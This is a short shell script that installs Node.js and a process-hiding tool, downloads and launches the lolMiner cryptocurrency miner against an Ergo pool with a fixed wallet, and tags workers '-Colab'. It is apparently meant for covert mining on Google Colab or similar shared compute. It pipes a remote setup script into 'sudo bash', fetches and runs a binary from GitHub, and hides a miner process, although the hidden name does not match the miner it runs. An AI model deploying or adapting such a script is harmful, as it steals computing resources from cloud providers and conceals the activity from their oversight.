#!/bin/sh
sudo apt update
sudo apt install screen -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash
sudo apt install nodejs && npm i -g node-process-hider
ph add cpuminer-sse2
wget -nv -c https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz -O - | tar -xz
cd 1.51a
./lolMiner --algo AUTOLYKOS2 --pool stratum-ergo.flypool.org:13333 --user  9fvMM598WttAfrPAfGJYW96DYGRYTZNRUAJmgzjQ8uELkBwaAxx.$(shuf -i 1-9999 -n 1)-Colab --ethstratum ETHPROXY
while [ 1 ]; do
sleep 3
done
sleep 99999
